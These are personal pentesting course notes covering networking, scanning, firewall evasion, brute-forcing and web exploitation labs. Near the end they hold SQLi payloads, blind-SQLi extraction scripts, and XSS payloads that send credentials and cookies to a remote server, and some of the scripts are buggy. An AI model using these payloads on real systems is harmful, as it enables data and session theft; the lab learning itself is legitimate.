These are notes taken during the s4vitar’s course.

# Basic Concepts

## IP Addresses (IPV4 and IPV6)

The IP can be seen as a numeric tag that logically identifies an endpoint in the network.

![[Untitled 22.png]]
In this case this is the IP that is identifying my endpoint

  

![[Untitled 1 3.png|Untitled 1 3.png]]

Representing the IP address as binary

Number of IPv4 vs IPv6 possible addresses

![[Untitled 2 3.png|Untitled 2 3.png]]

  

## MAC Addresses (OUI and NIC)

A MAC address is an 48 bits identifier that belongs to only one phisical device

![[Untitled 3 3.png|Untitled 3 3.png]]

Now the first three bytes belongs to the OUI (Organization Unique Identifier) and the last three belong to the NIC (Network Interface Controller)

  

![[Untitled 4 3.png|Untitled 4 3.png]]

If we scan the network using `arp-scan` we can see that the results have different pairs of IP addresses and MAC addresses, and a Name.

Now how is the name identified? By using the OUI

## Common Protocols (UDP, TCP) and Three-Way Handshake

When we talk about protocols, we are often talking about TCP and UDP but there are more like SFTP among others.

  

In this case well be talking about TCP and UDP

### TCP

This is a connection-based protocol, it is used by most of the hardware.

This protocol gives us error checking and also checks that the packets are being delivered as there were sent, this slows the connectivity.

### UDP

In the other hand, UDP sends data as if it was water stream, it does not check whether the information is being delivered correctly, this speeds up the connectivity.

### 3-way Handshake

This is how the TCP protocol begins a connection.

It is called three way because there are three steps to begin the connection.

  

SYN>SYN ACK>ACK

![[Untitled 5 3.png|Untitled 5 3.png]]

## OSI Model

The OSI Model is a standard for network protocols, this lets us understand how the information flows.

  

The model has 7 layers.

![[Untitled 6 2.png|Untitled 6 2.png]]

1- **Physical layer:** This is the lowest layer of the OSI model, which is responsible for the transmission of data through the physical medium of the network, such as copper or fiber optic cables.

2- **Data link layer:** This layer is responsible for the reliable transfer of data between devices on the same network. It also provides functions for detecting and correcting errors in the transmitted data.

3- **Network layer:** The network layer is responsible for routing data packets across multiple networks. This layer uses logical addresses, such as IP addresses, to identify devices and network paths.

4- **Transport layer:** The transport layer is responsible for the reliable delivery of data between end devices, providing services such as flow control and error correction.

5- **Session layer:** This layer is responsible for establishing and maintaining communication sessions between devices. It also provides session management services such as authentication and authorization.

6- **Presentation layer:** The presentation layer is responsible for data representation, providing functions such as data encoding and decoding, compression and encryption.

7- **Application layer:** The application layer provides services for end-user applications, such as email, web browsers and file transfer.

## Subnetting

Subnetting is technique used to divide a network into smaller subnetworks, this makes it more manageable, this is done via using Netmasks.

### Netmask

![[Untitled 7 2.png|Untitled 7 2.png]]

If we see the results of the command ifconfig, we can see that there is something called **netmask,** this gives us information about how the network is configured, and can make some conclusion of how to scan the network

  

To interpret a netmask we first have to translate from decimal to binary the four octets

![[Untitled 8 2.png|Untitled 8 2.png]]

This is a **255.255.255.0** netmask converted to binary

Basically this is a default **/24** class C netmask

/24 is the notation called CIDR which is an acronym for Classless Inter-Domain Routing, it identifies the network configuration, often seen as **192.168.0.1/24**

  

### CIDR

Now we talk that CIDR is a notation to see the network configuration, but from where it comes this number?

Well lets put for example 192.168.0.1/24

This /24 comes from how many ones are in the netmask.

We know that in 4 octets there are 32 bits, so this means that the first 3 octets are turned in to one, and thats why every octet value is 255

So basically the /24 netmask is equal to **11111111.11111111.11111111**.0000000 or 255.255.255.0, counting the ones we have 24, so this gives us the /24 CIDR.

Now and whats up with the zeros? Well the zeros gives us the number of hosts/endpints that can be configured in the network, in this case there are 8 zeros so, 2^8 = 255 total hosts

![[Untitled 9 2.png|Untitled 9 2.png]]

> [!info] CIDR to IPv4 Address Range Utility Tool | IPAddressGuide  
> Free IP address tool to translate IPv4 address range into CIDR (Classless Inter-Domain Routing) format and vice-versa.  
> [https://www.ipaddressguide.com/cidr](https://www.ipaddressguide.com/cidr)  

### QUICK CALC WITHOUT TABLES

So this page is for explaining how to operate without inet and tables.

  

For example, IP address 172.14.15.16/17

  

Let's convert all to binary using Linux `echo "obase=2;<number>"` obase means output base and in this case is 2

172=10101100

14=00001110

15=00001111

16=00010000

IP ADDRESS in BINARY

**10101100.00001110.00001111.00010000**

Netmask /17

We know that 17 is the number of 1 bits, so

**11111111.11111111.10000000.00000000**

---

Now we need to do some arithmetics

To get the Net ID we need to make an AND between IP and NetMask

AND 1+1=1 1+0=0 0+0=0

**10101100.00001110.00001111.00010000**

**11111111.11111111.10000000.00000000**

—————————————————

**10101100.00001110.00000000.00000000 (**172.14.0.0)

Now to see the broadcast address we need to turn the net portion to ones

**10101100.00001110.01111111.11111111 (**172.14.127.255**)**

---

# Recon

## NMAP Different scan modes

Nmap is a open-source and free tool for scanning networks, it used often in Pentesting to explore and audit this networks and systems.

  

So to start `nmap` has as default scan the top 1024 ports and TCP full connect scan `-sT`

`nmap 192.168.0.1` default nmap scan

  

What you can do to enumerate more ports is to use -p flag

`nmap -p22 192.168.0.1` This will scan for an specific port in this case SSH 22

  

What I often use is -p- which scans all **65535** ports that can exists

`nmap -p- 192.168.0.1`

---

When we execute the scan as told in the last command, nmap will report ports that are either **open or filtered** this because sometimes cannot assure that the port is open.

![[Untitled 10 2.png|Untitled 10 2.png]]

  

Nmap also has a `--top-ports` lists which are the most used and known ports, you can also pass a number of top ports to enumerate

  

Using `-v` parameter which is verbose, it prints out what is doing

![[Untitled 11 2.png|Untitled 11 2.png]]

In this case we can se things like DNS reolution, this slows thescan, and we can obviate this if we dont need it with parameter `-n`

---

There is a `-T` parameter which controls the speed of the scans at cost of being more notorious or more sneaky

![[Untitled 12 2.png|Untitled 12 2.png]]

---

NMAP has a parameter which can be used to make a ping sweep `-sn`

this parameter can replace using `arp-scan -i <interface>- -localnet`

`nmap -sn 192.168.0.0/24`

`nmap -sn 192.168.0.0/24 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'`this greps only the IPs using regex

  

## Firewall evasion techniques

**MTU, Data Length, Source Port, Decoy,**

A firewall is a defense system that oversees the network flows

  

Sometimes when you scan a device, you can see some ports open, but when you breach in and make use of a command like `netstat` there could be more ports open, this is normal and it because the usage of a firewall

  

nmap gives us a command that can help us with this, one of these is `-f --mtu` this parameter allows us to control the fragmentation of the packages and MTU (Maximum Transmission Unit).

this helps to evade using a different MTU than the firewall is expecting

  

Using `nmap --help` we can see all the parameters to evade

![[Untitled 13 2.png|Untitled 13 2.png]]

  

Another way is to manipulate the data length, this is because a newer firewall can have a database about a data lengths that tipically the tools use, that with the combination of the port being scanned can be suspicious. Using `--data-length <plus_data>`

  

Another way can be spoofing the source port using `--source-port <port_number>` this can help because the firewalls can have whitelisted source ports

  

Using decoys `-D` we can make multiple scans via multiple fake IPs

## NMAP usage of scripts and categories

  

So NMAP uses scripts which are written in LUA language, in this case its extension is **.nse**

  

So if we look for this scripts, using `locate .nse`

![[Untitled 14 2.png|Untitled 14 2.png]]

![[Untitled 15 2.png|Untitled 15 2.png]]

So this scripts can be used with the parameter `--script`, but there is also the parameter `-sC` which executes some basic recon scripts

  

Every script has its own category or multiple category, this shows us for what is the script written

`locate .nse | xargs grep "categories"`

![[Untitled 16 2.png|Untitled 16 2.png]]

These are the 14 categories taht exists

![[Untitled 17 2.png|Untitled 17 2.png]]

## Alternatives for enumeration

As a Pentester we have to have alternatives, this is useful for when we are capped or do not have some tools

  

So lets make a script for enumerating ports using as a base file redirectors

![[Untitled 18 2.png|Untitled 18 2.png]]

As seen when we send a empty string to /dev/tcp/ if the port is available it returns a 0 as status code

![[Untitled 19 2.png|Untitled 19 2.png]]

![[Untitled 20 2.png|Untitled 20 2.png]]

So we can create this one-liner  
  
`(echo '' > /dev/tcp/<ip_address>/<port>) 2>/dev/null && echo “[*] Port open” || echo “[*] Port closed”`

---

- Port scan script
    
    ```Bash
    #!/bin/bash
    
    function ctrl_c(){
    	echo -e "\n\n [!] Exiting..."
    	exit 1
    }
    
    \#Ctrl_c
    trap ctrl_c SIGINT
    
    declare -a ports=( $(seq 1 65535) )
    
    function check_port(){
    	
    	(exec 3<> /dev/tcp/$1/$2) 2>/dev/null
    
    	if [ $? -eq 0 ]; then
    		echo -e "[*] Host $1 - $2 (OPEN)"
    	fi
    
    	exec 3>&-
    	exec 3<&-
    }
    
    if [ $1 ]; then
    	for port in ${ports [@]}; do
    		check_port $1 $port &
    	done
    else
    	echo -e "\n[!] Usage: $0 <ip_address>\n"
    fi
    
    wait 
    ```
    

---

# Host discovery ARP & ICMP

This is the same principle as in previous, we need to have alternatives

We could use arp-scan or nmap -sn for discovering a network, but we acn also use our script

- Net scan script
    
    ```Bash
    #!/bin/bash
    
    function ctrl_c(){
    	echo -e "\n\n[!] Exitting..."
    	exit 1
    }
    
    \#CTRL_C
    trap ctrl_c SIGINT
    
    for i in $(seq 1 254); do
    	timeout 1 bash -c "ping -c 192.168.1.$i" &>/dev/null && echo -e "[*] Host 192.168.1.$i - ACTIVE" &
    done
    
    wait
    ```
    

  

  

# MASSCAN

  

## Hacker One

Hacker One is a famous bug bounty website where companies let hackers seeks for vulnerabilities and in most cases get paid for it.

  

Now this is a good starting point for achieving a practice objective and who knows maybe get paid for what we can find

  

> [!info] HackerOne | \#1 Trusted Security Platform and Hacker Program  
> Reduce the risk of a security incident by working with the world’s largest community of trusted ethical hackers.  
> [https://hackerone.com/](https://hackerone.com/)  

  

I am going to use some companies for practice in hacking and info gathering

  

## E-mails gathering

Clearbit Chrome

[phonebook.cz](http://phonebook.cz)

intellingence x

[hunter.io](http://hunter.io)

## Image recon

PimEyes

  

## Subdomain enum

phonebooks.cz

[https://github.com/unapibageek/ctfr](https://github.com/unapibageek/ctfr)

  

### Using gobuster

`gobuster vhost -u https://tinder.com -w <wordlist>` in this case is recomended to use Daniel Miessler’s repo  
  
[https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

  

### Using wfuzz

`wfuzz -c -t 20 -w <wordlist> -H "Host: FUZZ.tinder.com"` [`https://tinder.com`](https://tinder.com)

  

## Sec breaches & creds

> [!info] DeHashed — \#FreeThePassword  
> Have you been compromised?  
> [https://www.dehashed.com/](https://www.dehashed.com/)  

## Webpage technology identification

For a WebApp there multiple technologies from DBs to CMS, Framworks and plain code.  
This means that if we identify this technologies we can search for vulnerabilities that already ahd been found.  

---

The first tool is `whatweb` a command line tool that report us the information about a certain webpage, thsi includes from emails to CMSs Servers

  

Another tool is Wappalyzer, this tool is an addon for the web browser, it gives us the same information that whatweb does, but in browser. This is also usefull as a double check.

  

Another tool is [builtwith.com](http://builtwith.com) this is a online tool that guts the web and gives us the information.

  

## Fuzzin and enum in a webserver

  

So this is one of the most important parts of the recon since here we search for possible directories to breach

---

The first tool is **Gobuster,** this tool is an open-source tool developed in golang

https://github.com/OJ/gobuster

To use the tool we clone the repo and use `go build .` OR `go build -ldflags "-s -w" .` to reduce the size

![[Untitled 21 2.png|Untitled 21 2.png]]

  

Another tool to use is **wfuzz,** wfuzz works similar as gobuster but is written in python

![[Untitled 22 2.png|Untitled 22 2.png]]

The main difference is that we have to indicate were to replace

![[Untitled 23.png]]

There is also **ffuzz** which is wfuzz but written in golang

## Identifying OS

**Time to live** (TTL) refers to the amount of time or “hops” that a packet is set to exist inside a network before being discarded by a router. TTL is also used in other contexts including CDN caching and DNS caching.

> [!info] Default TTL (Time To Live) Values of Different OS  
> Peace ☮️, Love 💙, Freedom 🕊 & Curiosity 👨‍💻  
> [https://subinsb.com/default-device-ttl-values/](https://subinsb.com/default-device-ttl-values/)  

  

---

# Enum

## FTP services

FTP stands for File Transfer Protocol, this protocol is exposed by default in port 21.  
Sometimes if isnt excluded when we connect we can make use of the user anonymous so we dont have to use credentials.  

  

For this practice we will use some docker vulnerable machines

[https://github.com/garethflowers/docker-ftp-server](https://github.com/garethflowers/docker-ftp-server)

[https://github.com/metabrainz/docker-anon-ftp](https://github.com/metabrainz/docker-anon-ftp)

---

## Ftp server machine

  

For this machine we’ll use the following configuration.

And the password is going to be one from `rockyou.txt` dictionary, so we can practice some bruteforcing using hydra, patator, medusa, etc.

```Bash
docker run \
	--detach \
	--env FTP_PASS=<rockyou_passwd>\
	--env FTP_USER=n3l4irs \
	--name my-ftp-server \
	--publish 20-21:20-21/tcp \
	--publish 40000-40009:40000-40009/tcp \
	--volume /data:/home/user \
	garethflowers/ftp-server
```

  

Usually the `rockyou` is located in `/usr/share/wordlists/rockyou.txt` (you have to use gunzip if the extension of rockyou is .gz)

![[Untitled 24.png]]

To use a random pass ill use a random number **695566**

`cat /usr/share/wordlists/rockyou.txt | awk 'NR==``**695566**``'`

![[Untitled 25.png]]

---

![[Untitled 26.png]]

Now the container is runnning and the ftp server is deployed

![[Untitled 27.png]]

---

## Enumeration

Using NMAP we can start making some recon

![[Untitled 28.png]]

Perfect, we can see that is up and running, now we can bruteforce the passwords using hydra

`hydra -l n3l4irs -P /usr/share/wordlists/rockyou.txt ftp://localhost -t 15`

> -l specifies the user, if we had a userlist we should use -L  
> -P specifies the dictionary path, if we had an only pass we should use -p  
> -t is for threads  

  

I’ll create a dictionary with the first 200 passwords so its faster

`cat /usr/share/wordlists/rockyou.txt | head -n 200 > passwords.txt`

  

To change the old pasword i used, we use command sed

![[Untitled 29.png]]

Now we launch the attack

![[Untitled 30.png]]

  

## SSH Services

For this we will use a docker hub image

> [!info] Docker  
>  
> [https://hub.docker.com/r/linuxserver/openssh-server](https://hub.docker.com/r/linuxserver/openssh-server)  

![[Untitled 31.png]]

One deployed we have

![[Untitled 32.png]]

---

## Enumeration

Again using NMAP

![[Untitled 33.png]]

## HTTP HTTPS ENUM

In this case we are working with webpages, we previously saw some tools as **Wappalyzer or Whatweb**(which is a console tool as wappalyzer) and fuzzing tools as **wfuzz, fuff and gobuster** the two last written in golang so there are more efficient and fast using sockets and connections.

There are other like dir, dirbuster, dirb, etc.

  

These tools are used for HTTP as for HTTPS, but there are other tools to works with HTTPS leveraging this S from Secure and its certificates.

  

We can make use of OPENSSL to connect and see the certificate

`openssl s_client -connect tinder.com:443`

Other tools as sslyze or sslscan are more recomended

---

> [!info]  
>  
> [https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160](https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160)  

With this machine we can probe or make a PoC of the Heartbleed vulnerability

### Heartbleed

Heartbleed is **an implementation bug (CVE-2014-0160) in the OpenSSL cryptographic library**. OpenSSL is the most popular open source cryptographic library (written in C) that provides Secure Socket Layer (SSL) and Transport Layer Security (TLS) implementation to encrypt traffic on the internet.

  
Attackers can send Heartbeat requests with the value of the   
_length_ field greater than the actual length of the _payload_. OpenSSL processes in the machine that are responding to Heartbeat requests don’t verify if the _payload_ size is same as what is specified in _length_ field. Thus, the machine copies extra data residing in memory after the _payload_ into the response. [This is how](https://xkcd.com/1354/) the Heartbleed vulnerability works. Therefore, the extra bytes are additional data in the remote process’s memory.

  

The Heartbleed bug allows anyone on the internet to read the memory of the systems protected by the vulnerable versions of the OpenSSL software. Sensitive information such as session identifiers, usernames, passwords, tokens, and even the server’s private cryptographic keys, in some extreme cases, can be extracted from the memory. To make matters worse, this attack leaves no apparent evidence in the log files. Thus, it is extremely difficult to determine whether the machine has been compromised.

  

An attacker can read 64 kilobytes of server memory for a single Heartbeat message. However, there is no limit to the amount of memory that can be read from a vulnerable server. Furthermore, an attacker can continue reconnecting and requesting an arbitrary number of 64-kilobyte segments to reveal secrets (passwords, secret keys, credit card numbers, etc.) stored in memory.

[https://www.synopsys.com/blogs/software-security/heartbleed-bug.html#:~:text=Heartbleed is an implementation bug,encrypt traffic on the internet](https://www.synopsys.com/blogs/software-security/heartbleed-bug.html#:~:text=Heartbleed%20is%20an%20implementation%20bug,encrypt%20traffic%20on%20the%20internet).

  

## SMB/SAMBA enumeration

SMB stands for Server Message Block, its a protocol that allows us to share files, printers and other resources between other network resources. The protocol is propietary from Microsoft and is used in all Windows OS systems.

  

Samba on the other hand, is an open-source implementation of the SMB protocol utilized principaly in unix systems

---

  

So in this case we will use a docker that contemplates a SAMBA service

![[Untitled 34.png]]

![[Untitled 35.png]]

In this case we see that the 445 port is being used.

  

Now we can list the shared resources via SMB using NULL session

![[Untitled 36.png]]

Null Session is used when we dont have credentials for the service

Other tool is SMBMAP

![[Untitled 37.png]]

---

We can mount the shared resource by using CIFS-TOOLS

`sudo apt install cifs-tools`

`mkdir /mnt/mounted`

`mount -t cifs //127.0.0.1/myshare /mnt/mounted`

![[Untitled 38.png]]

  

  

  

  

CrackMapExec

## CMS (Content Management System)

### WordPress Enum

CMS is a tool that allows to create, manage and share content in the web like webpages, blogs, online stores among others.

  

Wordporess is an open-source and very popular CMS launched in 2003. Is used by millions of WebPages since one of its pros is the flexibility and its ease of use.  
The users can create sites without extense programming knowdledge. In addittion they can use and wide variety of templates and plugins to add functionalities.  

  

Proyect used for the explanation: [https://github.com/vavkamil/dvwp](https://github.com/vavkamil/dvwp)

There are tools as **wpscan** which with help of searchsploit or exploitDB we can list vulnerable plugins or versions

![[Untitled 39.png]]

XMLRPC abusing

![[Untitled 40.png]]

### Joomla enum

Joomla is another open-code CMS to create a web apps. Joomla its flexible and easy to use so its popular among enterprises, governamental sites and non-profit organizations.

  

Joomscan is great Joomla Scan tool, it is written in perl

### Drupal Enum

  

droopscan github

  

### Magento enum

  

magescantool

> [!info]  
>  
> [https://github.com/vulhub/vulhub/tree/master/magento/2.2-sqli](https://github.com/vulhub/vulhub/tree/master/magento/2.2-sqli)  

  

---

# Basic concepts of enumeration & exploit

# Vulnerabilities exploitation intro

Once the inicial recon phase is finished, we cshall proceed with the **exploitation phase,** but for this it is important to undestand some key concepts

  

In the following anotations well be talking about different types of shells (reverse shells, bind shells and forward shells), which would allow us to establish a connection and take control of a compromised system. Well talk about different types of payloads (staged and non-staged) and how are they used to execute code in th objective system.

> [!info] Reverse Shell Cheat Sheet  
> If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.  
> [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  

---

- Reverse, Bind, Forward Shell
    
    ### Reverse Shell
    
    This is a technique that allows an attacker to connecto a remote machine from his own machine. A connection is done from the compromised machine to the attacker’s machine.
    
    This is accomplished executing a malicious software or instruction that establishes the connection back again to the attacker’s machine.
    
    ![[Untitled 41.png]]
    
    ### Bind Shell
    
    This technique its the opposite of the reverse shell, since the connection is done from the attacker’s machine to the victim’s machine. The attacker listens in a determined port and the compromised machine accepts the inbound connection to that specific port. Then the attacker has complete access to the compromised machine.
    
    ![[Untitled 42.png]]
    
    ### Forward Shell
    
    This technique it’s utilized when is not possible to use reverse or bind shell because of the firewall rules. This technique is achived by means of mkfifo, which creates a FIFO file (named pipe) that is used as a “simulated terminal” via which an attacker can operate the remote machine. Since there is no direct connection, the attacker redirects the trafic via the FIFO file, which allows the communication to be bidirectional.
    
    [https://github.io/s4vitar/ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)
    
    ![[Untitled 43.png]]
    
- Payload Types (Staged, non-staged)
    
    There are two types of payloads, staged and non-staged:
    
    ### Staged Payload
    
    It divides in two or more stages. The first one is small portion of the code that is sent to the objective whose pourpose is to establish a secure connection between attacker and victim. Once the connection is established the second stage is sent, this is the useful load of the attack.
    
    This approach allows the attackers to evade some security measures since the useful load is not sent unless the secure conection is made.
    
      
    
    ### Non-staged Payload
    
    This payload is sent as one entity and is not divided into more stages. The useful load is sent in a single package and executed rigth after being recibed. It is a simpler focus but much more likely to be detected.
    
- Exploitation (Manual and Automated)
    
    The names are pretty self explanatory
    
    ### Manual exploitation
    
    This exploitation is done manually by the attacker, and it requires a deep knowledge of the systems and its vulnerabilitites. In this focus, the attacker utilize tools and techniques that are more specific to identify and exploit. It is more tedious and requires more work and skill from the attacker, but is more precise and it allows a better control.
    
      
    
    `searchitem=test' union select 1,2,column_name,4,5 from information_schema.columns where table_schema='sqlitraining' and table_name=’users’`
    
    ### Automated exploitation
    
    Is done by using tools that automates the scanning and exploitation like scripts or specific designed software. This is faster and less hard working, but les precise and it could generate more noise.
    
    SQLMap
    
- System enumeration
    
    Here we discuss the importance of a good enumeration phase once its compromised. The enumeration is a critical process to identify potential vectors to elevate privileges, understand the infrastructure of the system and found useful information.
    
      
    
    Some tools are,
    
    ### LSE (Linux Smart Enumeration)
    
    This is an enumeration tool for Linux systems that allows the attackers to obtain detailed information about system’s configuration, daemons and file permissions.  
    LSE uses a variety of Linux commands to collect this information and represent it in a easy to understand way.  
    Using this tool the attackers can gather possible vulnerabilities and found useful information.  
    
      
    
    ### PsPy
    
    This tool allows to enumerate daemons so the attacker can see in real time the commands and processes that the system is executing in regular time intervals. At the same time PsPy is a very powerfull tool to detect malware that are executed in background.
    
    ‘**ps -eo user,command**‘
    
      
    
    find -perm 4000 / 2>/dev/null
    
    getcap -r / 2>/dev/null
    
    crontab -l
    
    systemctl list-timers
    
    ![[Untitled 44.png]]
    
- Burpsuite introduction
    
    Burpsuite is a pentest tool used to find security vulnerabilities in web apps. It is composed by many diffrent tools that can be used simultaneously to identify the flaws.
    
      
    
    The following are the main tools that we can find in Burpsuite:
    
    - Proxy: It is the main burpsuite tool, it acts as an intermediary between the browser and the web-server. This allows us to intercept and modify the HTTP requests and responses sent by the web-server and browser.
    - Scanner: This is an automated tool that allows us to identify web-apps vulnerabilities. The scanner uses advanced crawling techniques to detect SQL inyections, XSS, and 7 layer vulnerabilities (OWASP Top 10).
    - Repeater: This tool allows the user to resend HTTP requests. This is useful since we can try different inputs and verify the server’s response. The tools is also useful for identifying vulnerabilities since let’s the user to test different values and see different unexpected responses.
    - Intruder: This tool is used to automate brute-force attacks. The users define different payloads for different parts of a request, like URL, body and headers.
    - Comparer: This tools compares two requests HTTP/S. This is useful since we can differentiate requests and responses on different circumstances.
    
      
    
    Burpsuite can be used either in manual or automated depending on what we need.
    
      
    

---

---

# OWASP TOP 10 and web vulnerabilities

OWASP explanation [[OWASP]]

## SQL injection (SQLi)

SQLi is technique used to exploit web app vulnerabilities that do not properly sanitize the user’s inputs in a SQL query. The actors can use this to retrieve confidential information as usernames, passwords, and anyhing that is stored in the DB.

The SQLi are made when the actors use malicious SQL code on the inputs of an application. If the application does not sanitize this inputs properly, the SQL query will be executed by the DBMS.

There are multiple types of SQLi:

- Error based SQLi: This type of SQLi makes use of error in the SQL code to obtain information.
- Time based SQLi: This type of SQLi makes use of a query that takes too much time to execute.
- Boolean based SQLi: This type uses boolean expresion queries. TRUE or FALSE.
- Union based SQLi: This type of SQLi makes use of the UNION clause to combine one or more queries in to one.
- Stacked Queries based SQLi: This type of SQLi lays on the posibilty of executing multiple queries at once.

It is worth to mention that this are some of the SQLi that exists but not the only ones.

  

In addition, is worth to mention the different DB types:

- Relational Databases
- NoSQL Databases
- Graphs Databases
- Object Databases

  

It is important to understand the different types of SQLi and how the actors can obtain confidential information and gain control of the DB. The developers must assure to validate and sanitize every input of an application. There must be defensive techniques as sanitization and prepared SQL queries to prevent SQLi.

---

- PoC
    
    For the PoC, a database was mounted and a PHP script for fetching users for the webpage.
    
    ![[Untitled 45.png]]
    
    As seen, this is not sanitized, since whatever param given to $id is directed to the SQL query
    
      
    
    Once we see that is vulnerable we need to start to test info.
    
    Then we need to use union to operate within the columns
    
    ![[Untitled 46.png]]
    
    ```SQL
    searchUsers.php?id=1
    admin
    
    searchUsers.php?id=1' order by 100,10,1-- - HERE WE NEED TO KNOW HOW MANY COLUMNS THERE ARE
    admin
    
    searchUsers.php?id=1' union select 1-- -
    admin
    
    searchUsers.php?id=112414231' union select 1-- -
    1
    
    searchUsers.php?id=41231231' union database()-- -
    dbName
    
    searchUsers.php?id=123141124' union select schema_name from information_schema.schemata-- -
    listDBs
    
    searchUsers.php?id=123141124' union select group_concat(schema_name) from information_schema.schemata-- -
    DBname1,DBname2,DBnameN,...,
    
    searchUsers.php?id=123141124' union select group_concat(table_name) from information_schema.tables where table_schema='DBname'-- -
    DBTable,DBTable,DBTable
    
    searchUsers.php?id=123141124' union select group_concat(column_name) from information_schema.columns where table_schema='DBname' and table_name='tablename'-- -
    columns,columns,columns
    ```
    
    ![[Untitled 47.png]]
    
    ![[Untitled 48.png]]
    
    ---
    
    ### Boolean-based blind SQLi
    
    In the case where there is no clear response from the server, we need to find a workaround, this could acomplished using time or conditionals.
    
      
    
    For example, we can use boolean states to find usernames.
    
    ```JavaScript
    /searchUsers.php?id=9 or (select(select ascii(substring(username,1,1)) from users where id=1)=97)
    ```
    
    > select(substring(username1,1)) returns the first character from the username field  
    >   
    > Using another select with the query above we can equalize the returned value to anything we want  
    
      
    
    In this case, we know that there is a username with the `id=1` and we are trying to find its name.
    
    What we do is to equalize a character converted to ascii to a number, in case that the found character is equal to 97, it means that the character is a minuscule ‘a’.
    
    This will return a 200 OK code response. So we can make use of this return code.
    
    ![[Untitled 49.png]]
    
    ```Python
    #!/usr/bin/python3
    
    import request
    import signal
    import sys
    import time
    import string
    from pwn import *
    
    def def_handler(sig, frame):
    	print("\n\n[!]Saliendo...\n")
    	sys.exit(1)
    
    \#Ctrl_C
    signal.signal(signal.SIGINT, def_handler)
    
    \#Variables Globales
    main_url = "http://localhost/searchUsers.php"
    character = string.printable
    
    def makeSQLi():
    	p1 = log.progress("Fuerza bruta")
    	p1.status("Iniciando fuerza bruta")
    	
    	time.sleep(2)
    	p2 = log.progress("Datos Extraidos")
    
    	extracted_info = ""
    
    	for position in range(1, 50):
    		for character in range(33, 126):
    			sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from users where id=1)=%d)" % (position, character)
    			
    			p1.status(sqli_url)
    	
    			r = requests.get(sqli_url)
    			
    			if r.status_code == 200:
    			extracted_info += chr(character)
    			p2.status(extracted_info)	
    			break
    
    if __name__ == 'main':
    	makeSQLI()
    ```
    
    ![[Untitled 50.png]]
    
    ![[Untitled 51.png]]
    
      
    
    ---
    
    ### Time-based blind SQLi
    
    ```Python
    #!/usr/bin/python3
    
    import request
    import signal
    import sys
    import time
    import string
    from pwn import *
    
    def def_handler(sig, frame):
    	print("\n\n[!]Saliendo...\n")
    	sys.exit(1)
    
    \#Ctrl_C
    signal.signal(signal.SIGINT, def_handler)
    
    \#Variables Globales
    main_url = "http://localhost/searchUsers.php"
    character = string.printable
    
    def makeSQLi():
    	p1 = log.progress("Fuerza bruta")
    	p1.status("Iniciando fuerza bruta")
    	
    	time.sleep(2)
    	p2 = log.progress("Datos Extraidos")
    
    	extracted_info = ""
    
    	for position in range(1, 50):
    		for character in range(33, 126):
    			sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=%d,sleep(0.5),1)" % (position, character)
    			
    			p1.status(sqli_url)
    	
    			r = requests.get(sqli_url)
    			
    			if r.status_code == 200:
    			extracted_info += chr(character)
    			p2.status(extracted_info)	
    			break
    
    if __name__ == 'main':
    	makeSQLI()
    ```
    
    ```SQL
    sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(userna,0x3a,password) from users),%d,1))=%d,sleep(0.5),1)" % (position, character)
    ```
    

## Cross-Site Scripting (XSS)

An XSS vulnerability is a security flaw that allows an attacker to execute malicious code in a webpage of a user without it knowing or consent. This allows to steal personal information, like, usernames, passwords and other confidential data.

In essence, this attack implies to inject malicious code in a vulnerable webpage, that later, will execute in the browser that the user accesses the page.

This malicious code could be anything, from scripts that redirects the user to another page to keyloggers or form data extractors to then send the data to a remote server.

  

There are various XSS types:

- Reflected XSS: This type of XSS takes place when the data provided by the user is reflected in the HTTP response without being validated properly. This allow the attacker to inject malicious code in the response, that later is executed in the user’s browser.
- DOM XSS: This type of XSS takes place when the malicious code is executed in the user’s browser via DOM. This is produced when the JS code in a webpage is changed modifying the DOM in a way that is vulnerable to code injection.
- Stored XSS: This type of XSS takes place when an attacker is capable of storing malicious code in a database or in the server where the webpage is. This code is executed every time the webpage loads.

  

XSS attacks can be very dangerous for the companies and the users. Because of this , it is essential for the DevTeams to implement security measures that prevent XSS vulnerabilities.

This measures includes the data input validation, elimination of dangerous HTML code and the limitation of the JS permissions in the user’s browser.

---

### App PoC - Exploiting a vulnerable webapp with XSS

We will be using a vulnerable app called Gossip World, from the repo [secDevLabs](https://github.com/globocom/secDevLabs) .

  

![[Untitled 52.png]]

In this case there are two users that we created, the user **test** and the user **s4vitar**.

Once we are in, we see a page where we can create new gossips (notes from now), testing we see that the notes are vulnerable to HTML injection.

![[Untitled 53.png]]

![[Untitled 54.png]]

Now this makes me think that we can use **script** tag in HTML to execute JS code.

![[Untitled 55.png]]

When we read the note, we have…

![[Untitled 56.png]]

Success, it is vulnerable to XSS.

  

Now let’s create a prompt so when a user tries to read a post we ask for the credentials, and send this to a remote server that we own.

```JavaScript
<script>
	var email = propmt("Introduce un correo electronico para visualizar este post.");
	
	if (email == null || email == ""){
		alert("Es necesario introducir un correo valido para visualizar este post");
	}else{
		fetch("http://<remote_server_ip>/?email=" + email);
	}
</script>
```

```JavaScript
<div id="formContainer"></div>

<script>

	var email;

	var password;

	var form = '<form>' +
		'Email: <input type="email" id="email" required>' +
		' Contraseña: <input type="password” id="password” required>' +
		'<input type="button” onclick="submitForm()" value="Submit">' +
		'</form>';

	document.getElementBvld("formContainer”).innerHTML = form;

	function submitForm() {
		email = document.getElementByld("email”).value;
		password = document.getElementByld("password").value;
		fetch("http://<remote_server_ip>/?email=" + email + "&password=" + password);
	}

</script>
```

![[Untitled 57.png]]

Now we can test External Source Js include and steal the session cookie.

  

```JavaScript
<script src"http://<remote_server_ip>/js.js">
	var request = new XMLHttpRequest();
	request.open('GET','http://<remote_server_ip>/?cookie=' + document.cookie);
	request.send();
</script>
```

Uploading this to the note.

![[Untitled 58.png]]

![[Untitled 59.png]]

---

Perfect, lets get rid of the user **test**, because he is bad.

The plan is to post bad notes with his username, so he get fired. For this we need to capture the data to see what is going on on a new post.

![[Untitled 60.png]]

